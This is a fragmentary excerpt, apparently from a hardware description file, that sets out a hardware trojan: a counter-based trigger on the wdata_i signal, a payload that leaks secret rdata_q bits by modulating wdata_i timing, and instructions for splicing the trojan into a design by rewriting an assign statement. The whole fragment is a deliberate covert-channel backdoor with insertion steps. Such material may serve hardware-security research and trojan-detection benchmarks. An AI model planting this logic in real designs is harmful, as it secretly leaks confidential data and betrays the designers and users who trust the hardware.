 ...
 *   
 * Trigger: Counter on wdata_i
 * Payload: Modulate wdata_i timing to leak secret data
 * 
...
// ============================================================
// Leaks rdata_q bits through timing of wdata_i:
...
logic       covert_bit_out;         // Drives wdata_i when trojan active
...
//   Find the assign for wdata_i (or rd_error_o as fallback):
//     assign wdata_i = <normal_expr>;
//   Replace with:
//     assign wdata_i = trojan_active ? covert_bit_out : (<normal_expr>);
//
